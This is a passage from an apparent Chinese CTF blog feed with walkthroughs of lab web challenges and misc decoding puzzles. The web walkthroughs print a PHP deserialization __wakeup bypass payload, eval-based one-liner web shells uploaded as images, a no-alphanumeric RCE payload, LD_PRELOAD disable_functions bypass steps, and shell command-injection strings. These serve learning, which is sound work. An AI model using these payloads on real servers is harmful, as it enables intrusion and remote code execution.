src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121105104.png"></p><p>源码备份在<code>www.zip</code>中。下载以后有五个文件</p><blockquote><p>class.php</p><p>flag.php</p><p>index.js</p><p>index.php</p><p>style.css</p></blockquote><p>在index.php中有一段代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    include &#39;class.php&#39;;</span><br><span class="line">    $select &#x3D; $_GET[&#39;select&#39;];</span><br><span class="line">    $res&#x3D;unserialize(@$select);</span><br><span class="line">    ?&gt;</span><br></pre></td></tr></table></figure><p>再结合又一个class.php，所以这道题考点应该是反序列化。</p><p>class.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#39;flag.php&#39;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Name&#123;</span><br><span class="line">    private $username &#x3D; &#39;nonono&#39;;</span><br><span class="line">    private $password &#x3D; &#39;yesyes&#39;;</span><br><span class="line"></span><br><span class="line">    public function __construct($username,$password)&#123;</span><br><span class="line">        $this-&gt;username &#x3D; $username;</span><br><span class="line">        $this-&gt;password &#x3D; $password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        $this-&gt;username &#x3D; &#39;guest&#39;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        if ($this-&gt;password !&#x3D; 100) &#123;</span><br><span class="line">            echo &quot;&lt;&#x2F;br&gt;NO!!!hacker!!!&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">            echo &quot;You name is: &quot;;</span><br><span class="line">            echo $this-&gt;username;echo &quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">            echo &quot;You password is: &quot;;</span><br><span class="line">            echo $this-&gt;password;echo &quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">        if ($this-&gt;username &#x3D;&#x3D;&#x3D; &#39;admin&#39;) &#123;</span><br><span class="line">            global $flag;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;&lt;&#x2F;br&gt;hello my friend~~&lt;&#x2F;br&gt;sorry i can&#39;t give you the flag!&quot;;</span><br><span class="line">            die();</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>获取flag的代码位置是30-32行。分析这个Name对象，创建对象时可以为对象赋值，对象销毁时会判断password值是否是100，且username值是否为admin，如果两者都成立输出flag，但是__wakeup（）会在反序列化时调用将username值置为guest，所以需要反序列化逃逸。</p><p>我使用的构造对象</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Name&#123;</span><br><span class="line">    private $username &#x3D;&#39;admin&#39;;</span><br><span class="line">    private $password &#x3D;&#39;100&#39;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a &#x3D; new Name;</span><br><span class="line">echo serialize($a);</span><br><span class="line"></span><br><span class="line">O:4:&quot;Name&quot;:2:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;s:3:&quot;100&quot;;&#125;</span><br></pre></td></tr></table></figure><p>反序列化逃逸，使对象属性的数量大于原来的值，就可以绕过wakeup函数。最终payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?select&#x3D;O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;s:3:&quot;100&quot;;&#125;</span><br></pre></td></tr></table></figure><hr><h1 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h1><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121111429.png"></p><p>先尝试上传一个gif图片马内容为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;?php</span><br><span class="line">@eval($_POST[&#39;a&#39;]);</span><br></pre></td></tr></table></figure><p>页面提示过滤：</p><blockquote><p> NO! HACKER! your file included ‘&lt;?’</p></blockquote><p>尝试script执行php代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;eval($_POST[&#39;cmd&#39;])&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>可以上传，文件在/upload目录下。尝试修改后缀上传，phtml上传成功，可以执行php和script代码，使用蚁剑连接。</p><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121112135.png"></p><hr>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【极客大挑战 2019】RCE ME</title>
      <link href="2020/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DRCE%20ME/"/>
      <url>2020/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DRCE%20ME/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="极客大挑战-2019-RCE-ME"><a href="#极客大挑战-2019-RCE-ME" class="headerlink" title="[极客大挑战 2019]RCE ME"></a>[极客大挑战 2019]RCE ME</h1><p>源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#39;code&#39;]))&#123;</span><br><span class="line">            $code&#x3D;$_GET[&#39;code&#39;];</span><br><span class="line">                    if(strlen($code)&gt;40)&#123;</span><br><span class="line">                                        die(&quot;This is too Long.&quot;);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    if(preg_match(&quot;&#x2F;[A-Za-z0-9]+&#x2F;&quot;,$code))&#123;</span><br><span class="line">                                        die(&quot;NO.&quot;);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    @eval($code);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">            highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; ?&gt;</span><br></pre></td></tr></table></figure><p>分析一波，GET请求获得<code>code</code>，想要通过的话需要绕过两个检测：</p><ol><li>payload长度小于40</li><li>不能包含<code>a-z、A-Z、0-9</code></li></ol><p>和之前做过DMCTF里的一个不能用数字和字母构造payload一样，当时参考的博客是phith0n师傅的:<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">一些不包含数字和字母的webshell</a>，这次摸到了相关文章：<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">无字母数字webshell之提高篇</a>。</p><p>使用<code>url编码</code>+<code>~</code>取反构造不可见字符串，然后加上php7版本以后支持了使用：<code>($a)()</code>这样的方法动态执行函数，所以我们可以构造payload：<code>assert(eval($_POST[‘a’]))</code></p><p>先构造<code>assert</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo urlencode(~&#39;assert&#39;);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;结果：%9E%8C%8C%9A%8D%8B</span><br></pre></td></tr></table></figure><p>再构造<code>eval($_POST[&#39;a&#39;])</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo urlencode(~&#39;eval($_POST[\&#39;a\&#39;])&#39;);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;结果：%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%D8%9E%D8%A2%D6</span><br></pre></td></tr></table></figure><p>完整payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%D8%9E%D8%A2%D6);</span><br></pre></td></tr></table></figure><p>网站获得请求以后会进行url解码，由于是不可见字符可以绕过长度和正则表达式，之后执行代码时，前面的<code>~</code>取反再获得真正的函数名。</p><p>使用蚁剑连接，进后台在根目录找到了flag、readflag。打开flag内容为空，又打开readflag文件是一堆乱码，但是看到了文件头是<code>ELF</code>是linux的可执行文件。那么很有可能就是执行readflag才能获得flag，但是在终端执行时出现了一些问题：无论输入什么，终端都只会返回<code>ret=127</code>：</p><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201205201403.png"></p><p>搜索了一波，原来是是<strong>disable_function</strong>搞的鬼，这个表可以在phpinfo()中查看：</p><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201205201821.png"></p><p>因为<code>system</code>、<code>exec</code>、<code>shell_exec</code>等命令执行的函数都被禁止了，目前我理解的webshell就是通过这些函数才能在终端执行命令的，所以终端基本是个废的，所以就是寻找绕过<strong>disable_function</strong>的方法，网上有很多其他方法，其中一个方法：</p><p><strong>利用环境变量LD_PRELOAD来绕过</strong></p><blockquote><p>php的mail函数在执行过程中会默认调用系统程序/usr/sbin/sendmail，如果我们能劫持sendmail程序，再用mail函数来触发就能实现我们的目的</p><p>LD_PRELOAD是Linux系统的下一个有趣的环境变量：“它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的。</p></blockquote><p>正好蚁剑的插件中就有一个名为：<a target="_blank" rel="noopener" href="https://github.com/Medicean/as_bypass_php_disable_functions">as_bypass_php_disable_functions</a>的插件，可以选择在插件市场安装或是手动安装（github有步骤）。安装以后右键shell选择加载插件：</p><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201204234337.png"></p><p>插件的工作原理是自动上传几个绕过的文件，然后再用蚁剑连接上传的文件即可实现绕过，但是一开始的<code>/var/www/html</code>目录是没有上传权限的，我右键以后发现能修改权限，改成0777：</p><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201204190508.png"></p><blockquote><p>在这里我还遇到了问题，使用原来的shell执行插件功能以后，终端还是没有权限，但是我尝试了自己又上传了一个一句话木马，用这个新的一句话木马执行插件才成功，具体原因我也不清楚，如果有师傅知道原因求告知。</p></blockquote><p>上传一句话木马233.php：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">@eval($_POST[&#39;b&#39;]);</span><br></pre></td></tr></table></figure><p>再用一句话木马的shell执行插件：</p><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201204231514.png"></p><p>进入shell，目录下面多了一个名为<strong>.antproxy.php</strong>的文件：</p><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201204234445.png"></p><p>再使用蚁剑连接<strong>.antproxy.php</strong>，密码是运行插件的那个shell的密码，这时候就可以开开心心的去根目录下执行readflag获得flag辣。</p><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201204233847.png"></p><p>flag{a216900e-2427-48f7-9323-f65d0a3abdbf}</p>]]></content>
      
      
      <categories>
          
          <category> DROPS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> BUUCTF_Web </tag>
            
            <tag> RCE </tag>
            
            <tag> disable_function绕过 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【GXYCTF2019】Ping Ping Ping</title>
      <link href="2020/%5BGXYCTF2019%5DPing%20Ping%20Ping/"/>
      <url>2020/%5BGXYCTF2019%5DPing%20Ping%20Ping/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h1><p>题目链接：<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[GXYCTF2019]Ping%20Ping%20Ping">https://buuoj.cn/challenges#[GXYCTF2019]Ping%20Ping%20Ping</a></p><p>和DMCTF做的那道<strong>pingpingping</strong>类似，同样是使用管道符构造payload，先使用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip&#x3D;127.0.0.1|ls</span><br></pre></td></tr></table></figure><p>目录下有两个文件：<code>flag.php</code>、<code>index.php</code>。首先试出来了空格被过滤，使用以下绕过空格：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$IFS</span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$1 &#x2F;&#x2F;$1改成$加其他数字貌似都行</span><br><span class="line">&lt; </span><br><span class="line">&lt;&gt; </span><br><span class="line">&#123;cat,flag.php&#125;  &#x2F;&#x2F;用逗号实现了空格功能</span><br><span class="line">%20 </span><br><span class="line">%09 </span><br></pre></td></tr></table></figure><p>在linux下反单引号里面的指令会被执行 <strong>`ls`</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip&#x3D;|cat$IFS&#96;ls&#96;</span><br></pre></td></tr></table></figure><p>会输出该目录下所有可以打开的文件，可以查看<strong>index.php</strong>的部分源码有哪些过滤：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">/?ip=|\<span class="string">&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match))&#123;</span></span><br><span class="line"><span class="string">    echo preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match);</span></span><br><span class="line"><span class="string">    die(&quot;fxck your symbol!&quot;);</span></span><br><span class="line"><span class="string">  &#125; else if(preg_match(&quot;/ /&quot;, $ip))&#123;</span></span><br><span class="line"><span class="string">    die(&quot;fxck your space!&quot;);</span></span><br><span class="line"><span class="string">  &#125; else if(preg_match(&quot;/bash/&quot;, $ip))&#123;</span></span><br><span class="line"><span class="string">    die(&quot;fxck your bash!&quot;);</span></span><br><span class="line"><span class="string">  &#125; else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123;</span></span><br><span class="line"><span class="string">    die(&quot;fxck your flag!&quot;);</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  $a = shell_exec(&quot;ping -c 4 &quot;.$ip);</span></span><br><span class="line"><span class="string">  echo &quot;</span></span><br><span class="line"><span class="string">&quot;;</span></span><br><span class="line"><span class="string">  print_r($a);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure><p>一些基本的符号、空格、bash、任何形式的flag字眼都被过滤了。接下来就是找访问<strong>flag.php</strong>。在网上看了好多的题解，用了好多方法，但是网页输出都为空，原来以为和其他题目一样使用<strong>readflag</strong>的ELF执行文件访问，但是还没成功。其实执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip&#x3D;|cat$IFS&#96;ls&#96;</span><br></pre></td></tr></table></figure><p>这个payload的时候文件都已经输出了，我最后在网页源码找到了，原来是被注释了<span class='heimu'>我是傻逼</span>。</p><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201205110806.png"></p><p><strong>最后记录下学到的姿势和这道题目的其他思路</strong>：</p><ul><li><p>管道符：</p><ul><li><code>|</code>直接执行后面的语句。</li><li><code>||</code>如果前面语句错误，执行后面的语句。</li><li><code>&amp;</code>前面和后面命令都要执行，无论前面真假，</li><li><code>&amp;&amp;</code>如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</li></ul></li><li><p>使用以下绕过空格：</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$IFS</span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$&#123;IFS&#125;$1</span><br><span class="line">$IFS$1 &#x2F;&#x2F;$1改成$加其他数字貌似都行</span><br><span class="line">&lt;</span><br><span class="line">&lt;&gt; </span><br><span class="line">&#123;cat,flag.php&#125;  &#x2F;&#x2F;用逗号实现了空格功能</span><br><span class="line">%20 </span><br><span class="line">%09 &#x2F;&#x2F;需要php环境</span><br></pre></td></tr></table></figure><ul><li>覆盖源码里的<code>$a</code>变量（拼接变量）：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?ip&#x3D;127.0.0.1;a&#x3D;g;cat$IFS$1fla$a.php</span><br></pre></td></tr></table></figure><ul><li>使用sh执行脚本：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?ip&#x3D;127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</span><br></pre></td></tr></table></figure><ul><li>内联执行：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?ip&#x3D;|cat$IFS&#96;ls&#96;</span><br></pre></td></tr></table></figure><blockquote><p>附：大佬整理的博客（内含更多姿势）：<a target="_blank" rel="noopener" href="https://www.ghtwf01.cn/index.php/archives/273/">命令执行漏洞利用及绕过方式总结</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> DROPS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> BUUCTF_Web </tag>
            
            <tag> 正则绕过 </tag>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DMCTF之Misc</title>
      <link href="2020/DMCTF%E4%B9%8BMisc/"/>
      <url>2020/DMCTF%E4%B9%8BMisc/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这次比赛是第一次做Mics的题awa。</p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Check-in"><a href="#Check-in" class="headerlink" title="Check_in"></a>Check_in</h2><p>真·有手就行</p><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201130102716.png"></p><h2 id="fakezip"><a href="#fakezip" class="headerlink" title="fakezip"></a>fakezip</h2><p>看到题目<strong>fakezip</strong>翻译：假的压缩包，所以猜应该是伪加密，贴一个原理的博客：<a target="_blank" rel="noopener" href="https://blog.csdn.net/u011377996/article/details/79286958">zip伪加密</a>，使用010 Editor打开压缩包，</p><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201130103932.png"></p><p>找到01修改为00，再解压压缩包，虽然提示了压缩包错误但是直接无视，获得一个flag.txt</p><p>打开以后内容是：<code>♬♩¶♯♬♭♬♫♫♪♬∮♬♭‖♭♬♭♬∮♬♭‖♭♬♭♫♫♯=</code>，音符加密虽然是第一次听说，但是百度还是可以简单找到：<a target="_blank" rel="noopener" href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=yinyue">文本加密为音乐符号</a></p><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201130104321.png"></p><h2 id="Base-family"><a href="#Base-family" class="headerlink" title="Base family"></a>Base family</h2><p>题目给出了是base家族，所以base所有种类都试一遍。base常见的种类有：<code>base16</code>、<code>base32</code>、<code>base58</code>、<code>base64</code>、<code>base91</code>。还有几种没听过的base种类可以在这个网站找到：<a target="_blank" rel="noopener" href="http://ctf.ssleye.com/">CTF在线工具</a>。</p><p><strong>原层</strong>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XUZbB&#123;fp&#125;U)&#x3D;ql[n%GCbk9RZ7!XD$D)f1G&#123;011LN(TSlXCJT:4nxQ[8Y#I:&#x3D;k.Qi4t3&#x2F;S!,N&#x2F;%[I&#125;^8jjP|0&amp;whvi88gpQce(2lKt9ZHiT^g1.nZH,k&#x3D;kjTT16pHJ_DrW,Td&quot;^w$Q8+8T])e.llK?*z&#96;gS:+C]llUG:z1&#x3D;ekEN&#125;8DmJf&amp;GP&lt;Rk:o_Jk&lt;J.zp8%H0g7sYSTJ9p.&quot;duRBGj&#96;g0!I+xjm(fh)]IF:&gt;omN8&#x3D;m+Xp(X0:U*8Sj5|8p._o[i0:%.qu&#125;%_&#x3D;&lt;D</span><br></pre></td></tr></table></figure><p><strong>base91解码</strong>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3G6MzYGwFwTsqcb3MWzTdQBTHZWBZ2LUBprZ3P62T2nsbt1R7o6a7PEsXsBvSFvoexeZJEkhW9Wv1VusvpWK1nfWsVHDypW2j3MMEygzSYLmwxKV5kNwWomvXc5ohX2Jgj6bMRnu6JXkasXdbbw3Aw8Pvh6vWwPfTZ4mpkpNU9fDhyNi1bciCZMXeLiCWL67BVupHPobQcFWkpftgLPggB8wgwW</span><br></pre></td></tr></table></figure><p><strong>base58解码</strong>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JZVFSMSZPJMXQTTKMMZVS2TDGVGXUQJTJZKFM3KONJCTEWL2MN4U26SNGJGVIWJQJZ5GWMK2NJNGSTTNKV5E2RDDGNHFOWJTJZCFSNCNPJGTCWTKKF4U42SFGNGXUWJRJZVFSMSNKRNGWTL2IUZFS6TDGVHDEUJ5</span><br></pre></td></tr></table></figure><p><strong>base32解码</strong>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NjY2YzYxNjc3Yjc5MzA3NTVmNjE2YzcyMzM2MTY0Nzk1ZjZiNmUzMDc3NWY3NDY4MzM1ZjQyNjE3MzY1NjY2MTZkMzE2Yzc5N2Q&#x3D;</span><br></pre></td></tr></table></figure><p><strong>base64解码</strong>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">666c61677b7930755f616c72336164795f6b6e30775f7468335f4261736566616d316c797d</span><br></pre></td></tr></table></figure><p><strong>hex解码</strong>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;y0u_alr3ady_kn0w_th3_Basefam1ly&#125;</span><br></pre></td></tr></table></figure><h2 id="SlientEye"><a href="#SlientEye" class="headerlink" title="SlientEye"></a>SlientEye</h2><p>根据题目直接百度<strong>SlientEye</strong>，下载以后打开图片–&gt;decode：</p><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201130105145.png"></p><p>参数啥的都没动，密码为默认密码，直接Decode，得到一个flag.txt：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">&amp;#102;</span><span class="symbol">&amp;#108;</span><span class="symbol">&amp;#97;</span><span class="symbol">&amp;#103;</span><span class="symbol">&amp;#123;</span><span class="symbol">&amp;#110;</span><span class="symbol">&amp;#49;</span><span class="symbol">&amp;#95;</span><span class="symbol">&amp;#98;</span><span class="symbol">&amp;#117;</span><span class="symbol">&amp;#95;</span><span class="symbol">&amp;#106;</span><span class="symbol">&amp;#49;</span><span class="symbol">&amp;#97;</span><span class="symbol">&amp;#110;</span><span class="symbol">&amp;#103;</span><span class="symbol">&amp;#95;</span><span class="symbol">&amp;#119;</span><span class="symbol">&amp;#117;</span><span class="symbol">&amp;#95;</span><span class="symbol">&amp;#100;</span><span class="symbol">&amp;#51;</span><span class="symbol">&amp;#125;</span></span><br></pre></td></tr></table></figure><p>再去百度搜到一篇博客：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/philipding/p/10153094.html">&amp;#x开头的是什么编码?</a>，<del>我点开一看，哦，原来是</del>entity code实体编码，<del>我啪的一下就</del>把flag.txt改为flag.html，<del>很快啊，然后是一个左正蹬、一个右鞭腿、一个左刺拳</del>打开flag.html获得flag：<strong>flag{n1_bu_j1ang_wu_d3}</strong></p><h2 id="编码之王"><a href="#编码之王" class="headerlink" title="编码之王"></a>编码之王</h2><p>下载文件打开后一堆社会主义核心价值观，前面提到的：<a target="_blank" rel="noopener" href="http://ctf.ssleye.com/">CTF在线工具</a>就有核心价值观编码，下面放密文，上面是解码内容。</p><p>解出来以后看到第一句：<code>如是我闻:</code>，–&gt;<a target="_blank" rel="noopener" href="http://www.keyfc.net/bbs/tools/tudoucode.aspx">与佛论禅</a></p><p>再解之后看第一句：<code>新佛曰：</code>。–&gt;<a target="_blank" rel="noopener" href="http://hi.pcmoe.net/buddha.html">新与佛论禅</a></p><p>解完以后直接出了一堆由：<code>[、]、!、+、(、)</code>组成的符号，还是百度找到了这种编码叫JSfuck，可以直接浏览器控制台console输出获得flag</p><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201130110943.png"></p><h2 id="jpgsteg"><a href="#jpgsteg" class="headerlink" title="jpgsteg"></a>jpgsteg</h2><p>题目即是用到的工具，百度下载软件，使用jphide.exe打开图片<code>Tap code.jpg</code>，选择seek功能解密，密码为123456（我蒙的）：</p><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201130111311.png"></p><p>成功解密后获得一个文档，内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 